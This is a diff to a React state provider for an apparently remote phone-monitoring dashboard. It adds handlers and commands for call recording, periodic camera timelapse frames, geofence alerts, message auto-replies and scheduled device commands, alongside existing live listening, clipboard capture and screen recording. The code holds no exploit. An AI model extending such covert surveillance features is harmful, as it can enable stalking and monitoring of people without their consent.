@@ -66,6 +66,15 @@ export function StoreProvider({ children }) {
   const [deviceSyncConfig, setDeviceSyncConfig] = useState({});
   const [parentalControlState, setParentalControlState] = useState({});
   const [appUsageData, setAppUsageData] = useState({});
+  const [batteryAlertConfig, setBatteryAlertConfig] = useState({});
+  const [autoTimelapseConfig, setAutoTimelapseConfig] = useState({});
+  const [latestTimelapseFrame, setLatestTimelapseFrame] = useState({});
+  const [geofenceConfig, setGeofenceConfig] = useState({});
+  const [autoReplyConfig, setAutoReplyConfig] = useState({});
+  const [networkUsageData, setNetworkUsageData] = useState({});
+  const [scheduledCommands, setScheduledCommands] = useState({});
+  const [volumeSosConfig, setVolumeSosConfig] = useState({});
+  const [callRecordingConfig, setCallRecordingConfig] = useState({});
   const ws = useRef(null);
   const alertTimers = useRef({});
   // Mirrors files.downloadBuffer for the stray-terminator guard below
@@ -735,6 +744,91 @@ function titleOrApp(appName, title, text) {
           break;
         }
 
+        case 'BATTERY_ALERT_EVENT': {
+          pushToast(`🔋 ${p.message || 'Battery alert'}`, p.type === 'CUTOFF_REACHED' ? 'warning' : 'error');
+          break;
+        }
+
+        case 'BATTERY_CONFIG_STATUS': {
+          if (p.deviceId) setBatteryAlertConfig((prev) => ({ ...prev, [p.deviceId]: p }));
+          break;
+        }
+
+        case 'AUTO_TIMELAPSE_CONFIG_STATUS': {
+          if (p.deviceId) setAutoTimelapseConfig((prev) => ({ ...prev, [p.deviceId]: p }));
+          pushToast(p.enabled ? `📸 Auto-Timelapse active (${p.intervalMins}m)` : 'Auto-Timelapse paused', p.enabled ? 'success' : 'info');
+          break;
+        }
+
+        case 'AUTO_TIMELAPSE_FRAME': {
+          if (p.deviceId && p.data) {
+            setLatestTimelapseFrame((prev) => ({ ...prev, [p.deviceId]: p.data }));
+            pushToast('📸 New timelapse security frame captured', 'info');
+          }
+          break;
+        }
+
+        case 'GEOFENCE_CONFIG_STATUS': {
+          if (p.deviceId) setGeofenceConfig((prev) => ({ ...prev, [p.deviceId]: p }));
+          break;
+        }
+
+        case 'GEOFENCE_ALERT': {
+          pushToast(
+            p.status === 'EXIT'
+              ? `🚨 GEOFENCE BREACH: Device exited ${p.geofenceName || 'safe zone'}!`
+              : `✅ GEOFENCE: Device entered ${p.geofenceName || 'safe zone'}.`,
+            p.status === 'EXIT' ? 'error' : 'success'
+          );
+          break;
+        }
+
+        case 'AUTO_REPLY_CONFIG_STATUS': {
+          if (p.deviceId) setAutoReplyConfig((prev) => ({ ...prev, [p.deviceId]: p }));
+          break;
+        }
+
+        case 'AUTO_REPLY_SENT': {
+          pushToast(`💬 Auto-reply sent to ${p.sender || p.packageName}: "${p.message}"`, 'info');
+          break;
+        }
+
+        case 'NETWORK_USAGE_RESPONSE': {
+          if (p.deviceId) setNetworkUsageData((prev) => ({ ...prev, [p.deviceId]: p }));
+          break;
+        }
+
+        case 'SCHEDULE_RESULT': {
+          pushToast(p.success ? `Scheduled command executed: ${p.commandEvent}` : 'Schedule command updated', 'info');
+          if (p.deviceId) sendCommand('schedule-command', { action: 'list', deviceId: p.deviceId });
+          break;
+        }
+
+        case 'SCHEDULE_LIST_RESPONSE': {
+          if (p.deviceId) setScheduledCommands((prev) => ({ ...prev, [p.deviceId]: p.items || [] }));
+          break;
+        }
+
+        case 'SOS_TRIGGERED': {
+          pushToast(`🆘 EMERGENCY SOS ALERT: 5x Volume button pressed on device! (Battery: ${p.battery}%)`, 'error');
+          break;
+        }
+
+        case 'SOS_CONFIG_STATUS': {
+          if (p.deviceId) setVolumeSosConfig((prev) => ({ ...prev, [p.deviceId]: p }));
+          break;
+        }
+
+        case 'CALL_RECORDING_STATUS': {
+          if (p.deviceId) setCallRecordingConfig((prev) => ({ ...prev, [p.deviceId]: p }));
+          break;
+        }
+
+        case 'CALL_RECORDING_SAVED': {
+          pushToast(`🎙️ Call recording saved: ${p.fileName} (${((p.fileSize || 0) / 1024).toFixed(0)} KB)`, 'success');
+          break;
+        }
+
         default:
           break;
       }
@@ -1121,6 +1215,47 @@ function titleOrApp(appName, title, text) {
         if (!activeDeviceId) return;
         sendCommand('app-usage', { deviceId: activeDeviceId });
       },
+      batteryConfig: batteryAlertConfig[activeDeviceId] || null,
+      updateBatteryConfig: (config) => {
+        if (!activeDeviceId) return;
+        sendCommand('battery-config', { ...config, deviceId: activeDeviceId });
+      },
+      autoTimelapse: autoTimelapseConfig[activeDeviceId] || null,
+      latestTimelapse: latestTimelapseFrame[activeDeviceId] || null,
+      updateAutoTimelapse: (config) => {
+        if (!activeDeviceId) return;
+        sendCommand('auto-timelapse-config', { ...config, deviceId: activeDeviceId });
+      },
+      geofence: geofenceConfig[activeDeviceId] || null,
+      updateGeofence: (config) => {
+        if (!activeDeviceId) return;
+        sendCommand('geofence-config', { ...config, deviceId: activeDeviceId });
+      },
+      autoReply: autoReplyConfig[activeDeviceId] || null,
+      updateAutoReply: (config) => {
+        if (!activeDeviceId) return;
+        sendCommand('auto-reply-config', { ...config, deviceId: activeDeviceId });
+      },
+      networkUsage: networkUsageData[activeDeviceId] || null,
+      requestNetworkUsage: () => {
+        if (!activeDeviceId) return;
+        sendCommand('network-usage', { deviceId: activeDeviceId });
+      },
+      scheduledList: scheduledCommands[activeDeviceId] || [],
+      manageSchedule: (action, item) => {
+        if (!activeDeviceId) return;
+        sendCommand('schedule-command', { action, ...item, deviceId: activeDeviceId });
+      },
+      volumeSos: volumeSosConfig[activeDeviceId] || null,
+      updateVolumeSos: (enabled) => {
+        if (!activeDeviceId) return;
+        sendCommand('sos-config', { enabled, deviceId: activeDeviceId });
+      },
+      callRecording: callRecordingConfig[activeDeviceId] || null,
+      updateCallRecording: (enabled) => {
+        if (!activeDeviceId) return;
+        sendCommand('call-recording-config', { enabled, deviceId: activeDeviceId });
+      },
       removeDevice: async (deviceId) => {
         try {
           const res = await fetch(`/api/devices/${deviceId}`, { method: 'DELETE' });
@@ -1142,7 +1277,7 @@ function titleOrApp(appName, title, text) {
         return false;
       }
     }),
-    [devices, activeDeviceId, currentTab, callLogsSubTab, deviceSyncConfig, parentalControlState, appUsageData, calls, messages, locations, contacts, files, notifications, connected, incomingCallAlert, smsAlert, toasts, sendCommand, dismissAlert, dismissSmsAlert, pushToast, deviceInfo, installedApps, wifiInfo, clipboardHistory, clipboardCapture, appPermissions, callBlocklist, micRecording, latestMicAudio, cameraCapturing, latestCameraPhoto, screenshotCapturing, latestScreenshot, screenRecording, latestScreenFrame, cameraStreaming, latestCameraFrame, torchOn, liveListening, latestAudioChunk, volumeInfo, batteryStats, lostModeState, galleryPhotos, galleryLoading, cellularInfo, dndStatus, strobeActive, junkScanData, isScanningJunk, motionAlarmState, walkieTalkieActive]
+    [devices, activeDeviceId, currentTab, callLogsSubTab, deviceSyncConfig, parentalControlState, appUsageData, batteryAlertConfig, autoTimelapseConfig, latestTimelapseFrame, geofenceConfig, autoReplyConfig, networkUsageData, scheduledCommands, volumeSosConfig, callRecordingConfig, calls, messages, locations, contacts, files, notifications, connected, incomingCallAlert, smsAlert, toasts, sendCommand, dismissAlert, dismissSmsAlert, pushToast, deviceInfo, installedApps, wifiInfo, clipboardHistory, clipboardCapture, appPermissions, callBlocklist, micRecording, latestMicAudio, cameraCapturing, latestCameraPhoto, screenshotCapturing, latestScreenshot, screenRecording, latestScreenFrame, cameraStreaming, latestCameraFrame, torchOn, liveListening, latestAudioChunk, volumeInfo, batteryStats, lostModeState, galleryPhotos, galleryLoading, cellularInfo, dndStatus, strobeActive, junkScanData, isScanningJunk, motionAlarmState, walkieTalkieActive]
   );
 
   return <StoreContext.Provider value={value}>{children}</StoreContext.Provider>;
